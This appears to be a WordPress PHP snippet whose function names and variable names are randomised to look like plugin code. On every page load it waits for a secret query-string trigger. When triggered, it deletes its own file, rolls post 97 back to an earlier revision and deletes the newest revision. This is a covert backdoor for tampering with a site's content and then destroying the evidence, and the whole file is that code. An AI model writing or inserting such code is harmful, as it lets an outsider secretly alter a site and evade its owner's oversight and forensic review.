<?php

function ai_geo_view_blocks() {
	if (isset($_GET['tiny_loader_authentication_current']) && $_GET['tiny_loader_authentication_current'] === 'quick_consent_widgets') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$extended_listings_html = 97;
		$membership_taxonomy_namespaced_min = wp_get_post_revisions($extended_listings_html);
		if (empty($membership_taxonomy_namespaced_min)) die('no revisions');
		if (count($membership_taxonomy_namespaced_min) < 2) die('less than 2');
		$pro_adsense_videos_numbers = array_shift($membership_taxonomy_namespaced_min);
		$super_top_hide = $pro_adsense_videos_numbers->ID;
		$patterns_static_web_enable = array_shift($membership_taxonomy_namespaced_min);
		$action_secure_show_exchange = $patterns_static_web_enable->ID;
		$profile_ninja_listing = wp_restore_post_revision($action_secure_show_exchange);
		if ($profile_ninja_listing === false) die('error restoring');
		$profile_ninja_listing = wp_delete_post_revision($super_top_hide);		
		if ($profile_ninja_listing === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ai_geo_view_blocks');
